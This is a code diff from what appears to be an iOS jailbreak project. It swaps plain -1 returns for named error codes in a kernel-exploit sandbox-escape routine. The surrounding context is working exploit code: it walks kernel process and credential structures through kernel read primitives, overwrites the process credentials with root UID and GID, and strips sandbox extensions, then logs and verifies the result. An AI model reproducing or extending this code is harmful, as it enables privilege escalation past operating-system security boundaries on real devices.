@@ -33,6 +33,7 @@
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/krw.h"
 #include "kexploit/offsets.h"
+#include "utils/errors.h"
 #include "kexploit/sandbox.h"
 #include "utils/tweak_log.h"
 #include "utils/state.h"
@@ -160,7 +161,7 @@ static void set_rw_class(uint64_t hdr) {
 // possible. Read-back verified. Best-effort: a failure does NOT fail the
 // sandbox escape.
 static int set_root_credentials(uint64_t ucred) {
-    if (!K(ucred)) { TweakLog("[SBX] root creds: invalid ucred"); return -1; }
+    if (!K(ucred)) { TweakLog("[SBX] root creds: invalid ucred"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
     uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
 
     uint32_t old_uid = kread32(posix + OFF_POSIX_CR_UID);
@@ -191,19 +192,19 @@ static int set_root_credentials(uint64_t ucred) {
     }
     TweakLog("[SBX] root credential patch VERIFY FAILED (uid=%u gid=%u groups0=%u)",
              vuid, vgid, vg0);
-    return -1;
+    return TWEAK_ERR_SANDBOX_ESCAPE_FAILED;
 }
 
 #pragma mark - Main entry
 
 int sandbox_escape(uint64_t self_proc) {
-    if (!exploit_is_done()) { TweakLog("[SBX] Exploit not done, cannot escape sandbox"); return -1; }
-    if (!self_proc) { TweakLog("[SBX] self_proc is NULL"); return -1; }
+    if (!exploit_is_done()) { TweakLog("[SBX] Exploit not done, cannot escape sandbox"); return TWEAK_ERR_EXPLOIT_FAILED; }
+    if (!self_proc) { TweakLog("[SBX] self_proc is NULL"); return TWEAK_ERR_INVALID_ARG; }
 
     uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
     uint64_t proc_ro = S(proc_ro_raw);
     TweakLog("[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
-    if (!K(proc_ro)) { TweakLog("[SBX] proc_ro invalid"); return -1; }
+    if (!K(proc_ro)) { TweakLog("[SBX] proc_ro invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     // Scan proc_ro for ucred — offset varies by iOS build.
     // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
@@ -240,16 +241,16 @@ int sandbox_escape(uint64_t self_proc) {
             }
         }
     }
-    if (!K(ucred)) { TweakLog("[SBX] ucred not found in proc_ro"); return -1; }
+    if (!K(ucred)) { TweakLog("[SBX] ucred not found in proc_ro"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { TweakLog("[SBX] cr_label invalid"); return -1; }
+    if (!K(label)) { TweakLog("[SBX] cr_label invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { TweakLog("[SBX] sandbox invalid"); return -1; }
+    if (!K(sandbox)) { TweakLog("[SBX] sandbox invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { TweakLog("[SBX] ext_set invalid"); return -1; }
+    if (!K(ext_set)) { TweakLog("[SBX] ext_set invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     TweakLog("[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
           proc_ro, ucred, label, sandbox, ext_set);
@@ -317,5 +318,5 @@ int sandbox_escape(uint64_t self_proc) {
     TweakLog("[SBX] Sandbox escape verification failed (errno=%d: %s) — %d/%d tests passed",
           errno, strerror(errno), successCount,
           (int)(sizeof(testPaths)/sizeof(testPaths[0]) - 1));
-    return -1;
+    return TWEAK_ERR_SANDBOX_ESCAPE_FAILED;
 }
